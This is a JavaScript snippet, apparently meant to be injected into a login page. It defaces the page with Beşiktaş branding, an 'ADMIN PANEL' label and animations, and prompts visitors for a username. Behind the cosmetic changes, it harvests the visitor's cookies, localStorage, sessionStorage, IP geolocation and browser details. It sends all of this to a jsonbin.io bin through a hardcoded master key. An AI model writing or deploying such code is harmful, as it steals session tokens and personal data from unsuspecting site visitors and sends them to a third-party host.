(async () => {
  const body = document.body;
  body.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/tr/2/22/Besiktas_CJK.png')";
  body.style.backgroundSize = "cover";
  body.style.backgroundRepeat = "no-repeat";
  body.style.backgroundPosition = "center";
  body.style.transition = "background-color 0.5s, color 0.5s";

  let isDarkMode = true;
  body.style.backgroundColor = '#000000';
  body.style.color = '#FFFFFF';

  const logo = document.querySelector('img');
  if (logo) {
    logo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
    logo.style.width = '150px';
    logo.style.border = '3px solid white';
  }

  document.querySelectorAll('h1,h2,h3,h4,h5').forEach(el => el.textContent = 'Resmi Sayfa');

  const loginButton = document.querySelector('button[type="submit"]');
  if (loginButton) {
    loginButton.textContent = 'Giriş Yap';
    loginButton.style.backgroundColor = '#000000';
    loginButton.style.color = '#FFFFFF';
    loginButton.style.fontWeight = '600';
    loginButton.style.border = '2px solid white';
    loginButton.style.cursor = 'pointer';
  }

  const adminPanelLabel = document.createElement('div');
  adminPanelLabel.textContent = "ADMIN PANEL";
  Object.assign(adminPanelLabel.style, {
    position: 'fixed',
    top: '50px',
    left: '50%',
    transform: 'translateX(-50%)',
    fontWeight: '700',
    fontSize: '22px',
    padding: '6px 15px',
    borderRadius: '12px',
    zIndex: '99999',
    userSelect: 'none',
    transition: 'color 0.5s, background-color 0.5s',
    cursor: 'default',
  });

  function updateAdminPanelColors() {
    if (isDarkMode) {
      adminPanelLabel.style.color = "#FFFFFF";
      adminPanelLabel.style.backgroundColor = "rgba(0,0,0,0.7)";
      adminPanelLabel.style.textShadow = "0 0 5px #FFFFFF";
    } else {
      adminPanelLabel.style.color = "#000000";
      adminPanelLabel.style.backgroundColor = "rgba(255,255,255,0.8)";
      adminPanelLabel.style.textShadow = "0 0 3px #000000";
    }
  }
  updateAdminPanelColors();
  document.body.appendChild(adminPanelLabel);

  setInterval(() => {
    isDarkMode = !isDarkMode;
    if (isDarkMode) {
      body.style.backgroundColor = '#000000';
      body.style.color = '#FFFFFF';
    } else {
      body.style.backgroundColor = '#FFFFFF';
      body.style.color = '#000000';
    }
    updateAdminPanelColors();
  }, 20000);

  function flyEagle() {
    const eagleAnimation = document.createElement('img');
    eagleAnimation.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
    Object.assign(eagleAnimation.style, {
      position: 'fixed',
      top: '50%',
      left: '-200px',
      width: '100px',
      transition: 'left 5s linear',
      zIndex: '9999',
    });
    document.body.appendChild(eagleAnimation);
    setTimeout(() => {
      eagleAnimation.style.left = '110%';
    }, 100);
    setTimeout(() => {
      document.body.removeChild(eagleAnimation);
    }, 5100);
  }
  setInterval(flyEagle, 30000);
  flyEagle();

  function displayScore() {
    const score = Math.floor(Math.random() * 100);
    let highestScore = localStorage.getItem('highestScore') || 0;
    if (score > highestScore) {
      localStorage.setItem('highestScore', score);
      console.log(`Yeni rekor: ${score}`);
    } else {
      console.log(`Skor: ${score}. Rekor: ${highestScore}`);
    }
  }
  displayScore();

  const userName = prompt("Lütfen kullanıcı adınızı giriniz:");
  if (userName) {
    const welcomeMessage = document.createElement('h2');
    welcomeMessage.textContent = `Hoşgeldiniz, ${userName}`;
    welcomeMessage.style.color = isDarkMode ? '#FFFFFF' : '#000000';
    welcomeMessage.style.textAlign = 'center';
    welcomeMessage.style.marginTop = '10px';
    document.body.prepend(welcomeMessage);
  }

  async function getIpLocation() {
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) throw new Error('IP API hatası');
      return await response.json();
    } catch (error) {
      console.warn('IP konumu alınamadı:', error);
      return null;
    }
  }
  const locationData = await getIpLocation();

  function collectData() {
    return {
      userName: userName || null,
      timestamp: new Date().toISOString(),
      location: locationData,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth,
      },
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      javaEnabled: navigator.javaEnabled(),
      onlineStatus: navigator.onLine,
    };
  }

  const apiKey = '$2a$10$WyBCjBNDWR47OqW/NsfqL...udbAialXkiuFTkWYLM7qQWa7G/A6m';  // jsonbin.io API Key
  const binId = '6874d568355eab5e8b1b13a3';       // jsonbin.io Bin ID

  async function getDataFromJsonBin() {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
      headers: { 'X-Master-Key': apiKey }
    });
    if (!res.ok) {
      console.error('Veri alma başarısız:', res.statusText);
      return null;
    }
    const json = await res.json();
    return json.record;
  }

  async function sendDataToJsonBin(data) {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': apiKey
      },
      body: JSON.stringify(data)
    });
    if (!res.ok) {
      console.error('Veri gönderme başarısız:', res.statusText);
    } else {
      console.log('Veri başarıyla gönderildi.');
    }
  }

  async function updateBinWithNewData(newData) {
    const currentData = await getDataFromJsonBin() || {};
    // Eğer mevcut data dizi ise yeni veriyi diziye ekle, değilse objeyi güncelle
    let updatedData;
    if (Array.isArray(currentData)) {
      updatedData = [...currentData, newData];
    } else if (typeof currentData === 'object' && currentData !== null) {
      updatedData = { ...currentData, ...newData };
    } else {
      updatedData = newData;
    }
    await sendDataToJsonBin(updatedData);
  }

  const dataToSend = collectData();
  await updateBinWithNewData(dataToSend);

  // Küçük bekleme koy, sonra veriyi çek ve göster
  setTimeout(async () => {
    const receivedData = await getDataFromJsonBin();
    console.log('Jsonbin’den alınan veri:', receivedData);
  }, 500);

})();
